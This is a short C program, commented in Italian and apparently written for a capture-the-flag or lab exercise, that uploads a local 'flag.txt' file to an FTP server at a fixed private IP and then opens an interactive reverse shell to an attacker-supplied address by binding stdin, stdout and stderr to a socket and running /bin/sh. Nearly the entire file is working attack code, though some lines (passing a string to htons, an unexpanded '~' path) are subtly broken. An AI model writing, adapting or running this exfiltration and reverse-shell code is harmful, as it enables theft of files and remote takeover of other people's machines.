#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <curl/curl.h>

void create_shellcode(char *ip, char* port);
int copy_file_to_ftp(const char *local_path, const char *remote_path, const char *ftp_url);
static size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream);

int main(int argc, char **argv){

    // Copia il file su un server FTP
    char* ftpUrl = "ftp://192.168.1.84";
    copy_file_to_ftp("~/Desktop/flag.txt", "/temp", ftpUrl);
    create_shellcode(argv[1], argv[2]);
    return 0;
}

void create_shellcode(char *ip, char* port)
{
    int scktd;
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(ip);
    client.sin_port = htons(port);
    scktd = socket(AF_INET, SOCK_STREAM, 0);
    connect(scktd, (struct sockaddr *)&client, sizeof(client));
    dup2(scktd, 0); // STDIN
    dup2(scktd, 1); // STDOUT
    dup2(scktd, 2); // STDERR
    execl("/bin/sh", "sh", "-i", NULL, NULL);
}

// Funzione di callback per scrivere i dati su file
static size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

// Funzione per copiare un file su un server FTP
int copy_file_to_ftp(const char *local_path, const char *remote_path, const char *ftp_url) {
    CURL *curl;
    CURLcode res;
    FILE *fp;

    // Inizializza libcurl
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Errore inizializzazione libcurl\n");
        return 1;
    }

    // Apre il file locale in modalità lettura binaria
    fp = fopen(local_path, "rb");
    if (!fp) {
        fprintf(stderr, "Impossibile aprire il file %s\n", local_path);
        curl_easy_cleanup(curl);
        return 1;
    }

    // Imposta le opzioni per la connessione FTP
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_URL, ftp_url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_READDATA, fp);

    // Esegue la richiesta FTP
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Errore durante l'upload del file: %s\n", curl_easy_strerror(res));
    }

    // Chiude il file e libera le risorse
    fclose(fp);
    curl_easy_cleanup(curl);

    return 0;
}